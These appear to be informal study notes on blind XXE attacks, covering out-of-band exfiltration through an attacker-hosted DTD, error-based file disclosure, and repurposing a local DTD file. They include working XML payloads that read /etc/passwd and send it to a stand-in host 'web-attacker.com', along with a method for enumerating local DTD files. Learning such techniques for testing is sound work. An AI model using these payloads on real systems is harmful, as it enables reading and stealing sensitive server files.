1. usn=ing an external DTD method ---> suppose we hosted an external DTD on a webserver that we can control 
Eg --> we can also do it localy using python server

so on the server we need to host something like this:

<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://web-attacker.com/?x=%file;'>">
%eval;
%exfiltrate;

once we have our malicious server setup we can request external entities like this 
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM
"http://web-attacker.com/malicious.dtd"> %xxe;]>

the data should be in collaborator request method

which can give us desired output
sometimes /etc/password may not work as it may have multiple lines with newline then we can use /etc/hostname wi=hich contains single lines

2.via error mesages
this method alsso uses external dtd to cause errror by storing inclusi=ding non existsnace file in xxe

eg:
<!ENTITY % file SYSTEM "file:///etc/passwd">     -----> file to retrieve
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'file:///invalid/%file;'>">    -------> non existence file is used
%eval;
%exfil;

request:
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "YOUR-DTD-URL"> %xxe;]>
that should acuse some error which may give info disclosure or the file specified



3.Exploiting blind XXE by repurposing a local DTD
blind XXE when out of band interaction in blocked
using error based XXe technique to get data we want withiin the domain
it needs to be an external DTD file that is local to the application server. 
Essentially, the attack involves invoking a DTD file that happens to exist on the local filesystem and 
repurposing it to redefine an existing entity in a way that triggers a parsing error containing sensitive data. 

for this to work a .dtd file must be present inside the system which we will use to get the data we want
eg.
+++++++++++++++++++++PAYLOad++++++++++++++++++++
<!DOCTYPE foo [
<!ENTITY % local_dtd SYSTEM "file:///usr/local/app/schema.dtd">             ----->local dtd file
<!ENTITY &#x25; file SYSTEM "file:///etc/passwd">                            ------> file we want to read
<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">    ---> non exstence file to cause error
&#x25;eval;
&#x25;error;
'>
%local_dtd;
]>

-----------------------PAYLOAD--------------------

locating a DTD file:

<!DOCTYPE foo [
<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">                   -------> when local dtd is present it should return code 200
%local_dtd;
]>

 we can cycle through a list of common dtd file present in a system and enumerate thriugh error messages to know about it
once we know which dtd is present we ca review the dtd as it is open source and use it as we want
